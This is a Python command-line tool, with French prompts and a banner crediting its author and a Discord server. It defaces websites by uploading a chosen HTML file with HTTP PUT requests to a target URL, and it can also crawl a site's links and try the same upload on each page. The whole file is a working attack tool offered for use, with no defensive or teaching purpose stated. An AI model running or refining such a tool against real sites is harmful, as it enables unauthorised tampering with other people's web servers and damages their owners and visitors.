# -*- coding: utf-8 -*-

import requests
import os.path
import sys
import os
import random
import re
from urllib.parse import urlparse
from bs4 import BeautifulSoup

try:
    import requests
    import os.path
    import sys
    import os
    import random
    from bs4 import BeautifulSoup
except ImportError:
    exit("installez requests, beautifulsoup4 et réessayez ...")

os.system("clear")

red    = "\033[31m"
blue   = "\033[34m"
bold   = "\033[1m"
reset  = "\033[0m"
green  = "\033[32m"
yellow = "\033[33m"

colors = [
    "\033[38;5;226m",
    "\033[38;5;227m",
    "\033[38;5;229m",
    "\033[38;5;230m",
    "\033[38;5;190m",
    "\033[38;5;191m",
    "\033[38;5;220m",
    "\033[38;5;221m",
    "\033[38;5;142m",
    "\033[38;5;214m",
]

color1, color2, color3, color4, color5 = random.sample(colors, 5)

banner = f"""
\033[32m  .----------------.  .----------------.  .----------------.  .-----------------. .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |      ___     | || |     ____     | || |    ___       | || | ____  _____  | || |     ___      | |
| |     |  _|    | || |   .'    `.   | || |  .' _ '.     | || ||_   \|_   _| | || |    |_  |     | |
| |     | |      | || |  /  .--.  \  | || |  | (_) '___  | || |  |   \ | |   | || |      | |     | |
| |     | |      | || |  | |    | |  | || |  .`___'/ _/  | || |  | |\ \| |   | || |      | |     | |
| |     | |_     | || |  \  `--'  /  | || | | (___)  \_  | || | _| |_\   |_  | || |     _| |     | |
| |     |___|    | || |   `.____.'   | || | `._____.\__| | || ||_____|\____| | || |    |___|     | |
| |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 

                    
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\t

  \033[33m[♥\]Auteur de l'outil : O&N

   [♥\]Discord     : https://discord.gg/teHyE9Tgq7\t
   
\033[32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

                    
                   \t"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
    ipt = input(tetew)
    return str(ipt)

def aox(script, target_url):
    op = open(script, "r").read()
    s = requests.Session()
    try:
        site = target_url.strip()
        if not site.startswith("http://"):
            site = "http://" + site
        req = s.put(site + "/" + script, data=op)
        if req.status_code > 200 or req.status_code >= 250:
            print(m + ">" + b + "[+] ÉCHEC" + b + " %s/%s" % (site, script))
        else:
            print(m + ">" + h + "[+] EN LIGNE" + h + " %s/%s" % (site, script))
    except requests.exceptions.RequestException:
        print(m + ">" + b + "[+] ÉCHEC" + b + " %s" % target_url)

def find_links(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    links = []
    for link in soup.find_all('a'):
        href = link.get('href')
        if href:
            links.append(href)
    return links

def crawl_and_deface(site_url, deface_file):
    try:
        response = requests.get(site_url)
        if response.status_code == 200:
            links = find_links(response.content)
            for link in links:
                if link.startswith('/'):
                    link = urlparse(site_url).scheme + "://" + urlparse(site_url).netloc + link
                aox(deface_file, link)
        else:
            print("Failed to retrieve content from %s" % site_url)
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)

def main(__bn__):
    print(__bn__)
    while True:
        try:
            choice = x("\033[33mChoisissez une option:\n1. Défacer un seul site\n2. Crawler et défacer les liens d'un site\n3. Quitter\n")
            if choice == "1":
                deface_single_site()
            elif choice == "2":
                crawl_and_deface_links()
            elif choice == "3":
                print("Au revoir!")
                exit()
            else:
                print("Option invalide, veuillez réessayer.")
        except KeyboardInterrupt:
            print("\nOpération annulée.")

def deface_single_site():
    try:
        a = x(f"\033[33mEntrez votre fichier .html de déface : \t")
        if not os.path.isfile(a):
            print("Fichier '%s' introuvable" % a)
            return
        target_url = x(f"\033[33mEntrez l'URL du site cible : \t")
        aox(a, target_url)
    except KeyboardInterrupt:
        print()

def crawl_and_deface_links():
    try:
        a = x(f"\033[33mEntrez votre fichier .html de déface : \t")
        if not os.path.isfile(a):
            print("Fichier '%s' introuvable" % a)
            return
        target_url = x(f"\033[33mEntrez l'URL du site cible : \t")
        crawl_and_deface(target_url, a)
    except KeyboardInterrupt:
        print()

if __name__ == "__main__":
    main(banner)
